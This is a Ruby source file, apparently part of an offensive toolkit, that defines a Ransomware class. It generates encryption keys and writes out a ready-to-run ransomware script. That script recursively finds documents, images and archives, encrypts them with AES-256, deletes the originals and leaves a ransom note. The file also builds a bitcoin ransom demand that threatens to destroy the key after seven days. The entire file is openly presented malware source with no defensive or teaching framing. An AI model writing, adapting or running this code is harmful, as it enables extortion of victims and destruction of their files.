require 'digest'
require 'openssl'
require_relative '../utils/colorize'

class Ransomware
  def self.generate_encryption_key
    key = OpenSSL::Random.random_bytes(32)
    iv = OpenSSL::Random.random_bytes(16)
    
    filename = "encryption_key_#{Time.now.to_i}.bin"
    File.binwrite(filename, key + iv)
    puts Colorize.green("Encryption key saved: #{filename}")
    
    { key: key, iv: iv, file: filename }
  end

  def self.generate_ransomware_script(target_directory = '/tmp')
    script = <<~RUBY
      require 'openssl'
      require 'fileutils'
      
      target_dir = '#{target_directory}'
      extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.jpg', '.png', '.zip', '.rar']
      
      key = OpenSSL::Random.random_bytes(32)
      iv = OpenSSL::Random.random_bytes(16)
      cipher = OpenSSL::Cipher.new('AES-256-CBC')
      cipher.encrypt
      cipher.key = key
      cipher.iv = iv
      
      def encrypt_file(filepath, cipher, key, iv)
        begin
          data = File.binread(filepath)
          encrypted = cipher.update(data) + cipher.final
          
          File.binwrite(filepath + '.encrypted', encrypted)
          File.delete(filepath)
          
          File.write(filepath + '.key', Base64.strict_encode64(key + iv))
          
          return true
        rescue => e
          return false
        end
      end
      
      def find_files(dir, extensions)
        files = []
        Dir.glob(File.join(dir, '**', '*')).each do |file|
          next unless File.file?(file)
          next if file.end_with?('.encrypted') || file.end_with?('.key')
          
          if extensions.any? { |ext| file.end_with?(ext) }
            files << file
          end
        end
        files
      end
      
      files = find_files(target_dir, extensions)
      puts "Found #{files.length} files to encrypt"
      
      files.each do |file|
        cipher.reset
        cipher.encrypt
        cipher.key = key
        cipher.iv = iv
        
        if encrypt_file(file, cipher, key, iv)
          puts "Encrypted: #{file}"
        end
      end
      
      ransom_note = <<~NOTE
      Your files have been encrypted.
      
      To decrypt, send 0.1 BTC to: [BITCOIN_ADDRESS]
      
      Contact: [EMAIL]
      NOTE
      
      File.write(File.join(target_dir, 'README.txt'), ransom_note)
      puts "Ransom note created"
    RUBY
    
    filename = "ransomware_#{Time.now.to_i}.rb"
    File.write(filename, script)
    puts Colorize.green("Ransomware script saved: #{filename}")
    filename
  end

  def self.generate_ransom_note(bitcoin_address, email, amount = '0.1')
    note = <<~TXT
      ============================================
      YOUR FILES HAVE BEEN ENCRYPTED
      ============================================
      
      All your important files have been encrypted with military-grade encryption.
      
      What happened?
      - Your files were encrypted using AES-256 encryption
      - Decryption is only possible with the private key
      - The private key is stored on our secure server
      
      What can you do?
      - Do NOT attempt to decrypt files yourself
      - Do NOT modify encrypted files
      - Contact us to get your decryption key
      
      How to recover your files:
      1. Send #{amount} BTC to: #{bitcoin_address}
      2. Email the transaction ID to: #{email}
      3. You will receive the decryption key within 24 hours
      
      Payment must be made within 7 days or the key will be destroyed.
      
      ============================================
    TXT
    
    filename = "ransom_note_#{Time.now.to_i}.txt"
    File.write(filename, note)
    puts Colorize.green("Ransom note saved: #{filename}")
    filename
  end
end

